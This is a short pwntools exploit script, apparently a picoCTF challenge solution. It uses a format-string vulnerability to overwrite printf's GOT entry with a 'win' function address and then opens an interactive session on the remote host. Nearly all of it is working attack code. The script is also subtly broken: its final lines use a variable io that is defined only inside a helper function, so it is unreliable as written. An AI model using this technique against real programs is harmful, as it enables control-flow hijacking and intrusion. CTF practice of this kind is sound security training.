### This can be used to overwrite GOT to direct execution to any win function
from pwn import *

elf = context.binary = ELF('./vuln')
context.log_level = 'critical'
host = 'rhea.picoctf.net'
port = 51098
p = remote(host,port)

def exec_fmt(payload):
    io = remote(host,port)
    io.sendline(payload)
    return io.recvall()


autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

print(offset)

TARGET = elf.got['printf']
WIN    = elf.symbols['win']

payload = fmtstr_payload(offset, {TARGET: WIN}, write_size='short')

io.sendline(payload)
print(io.recvall(timeout=1).decode(errors="ignore"))
io.interactive()
